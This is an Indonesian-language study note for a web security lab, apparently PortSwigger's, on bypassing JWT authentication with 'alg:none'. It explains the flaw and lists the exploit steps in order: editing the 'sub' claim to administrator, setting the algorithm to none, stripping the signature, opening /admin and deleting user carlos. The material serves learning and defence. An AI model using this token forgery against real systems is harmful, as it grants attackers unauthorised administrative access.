# JWT Authentication Bypass via Flawed Signature Verification

## Konsep

### Apa itu `alg:none`?

JWT normal:

```text
Header.Payload.Signature
```

Contoh:

```text
xxxxx.yyyyy.zzzzz
```

Artinya:

```text
Header = algoritma
Payload = data user
Signature = verifikasi
```

---

Kalau:

```json
{
 "alg":"none"
}
```

Artinya:

```text
JWT tidak pakai signature
```

JWT jadi:

```text
Header.Payload.
```

Perhatikan:

```text
tetap ada titik terakhir
```

---

### Kenapa bug bisa terjadi?

Normal:

Server:

```text
Terima JWT
↓
Verify signature
↓
Valid / gagal
```

Bug:

Server:

```text
Lihat:
alg=none
↓
Lewati verifikasi
↓
Terima payload begitu saja
```

Akibat:

```text
Attacker bisa ubah payload
↓
JWT tetap diterima
```

---

# Langkah Exploit

## 1. Login

Login:

```text
wiener:peter
```

Ambil JWT:

```text
GET /my-account
```

---

## 2. Coba Akses Admin

Kirim:

```text
GET /admin
```

Respon:

```text
401 Unauthorized
```

---

## 3. Edit Payload

Awal:

```json
{
 "sub":"wiener"
}
```

Ubah:

```json
{
 "sub":"administrator"
}
```

---

## 4. Ubah Header

Awal:

```json
{
 "alg":"HS256"
}
```

atau:

```json
{
 "alg":"RS256"
}
```

Ubah:

```json
{
 "alg":"none"
}
```

---

## 5. Hapus Signature

JWT awal:

```text
Header.Payload.Signature
```

Contoh:

```text
xxxxx.yyyyy.zzzzz
```

Ubah jadi:

```text
xxxxx.yyyyy.
```

Penting:

```text
hapus signature
↓
tetap sisakan titik terakhir
```

---

## 6. Kirim Request

Kirim:

```text
GET /admin
```

Respon:

```text
200 OK
```

Admin panel terbuka.

---

## 7. Delete Carlos

Cari:

```text
/admin/delete?username=carlos
```

Kirim request.

Lab solved.

---

# Cara Server Memproses

Server vulnerable:

```text
Terima JWT
↓
Lihat:
alg=none
↓
Tidak cek signature
↓
Baca:
sub=administrator
↓
Admin access
```

---

# Hafalan Cepat

```text
Login
↓
Ubah:
sub=administrator
↓
alg=none
↓
Hapus signature
↓
JWT:
Header.Payload.
↓
Server skip verify
↓
Admin
```

---

# Inti Lab

> `alg:none` = server menerima JWT tanpa verifikasi signature sehingga attacker bisa mengubah payload sesuka hati.
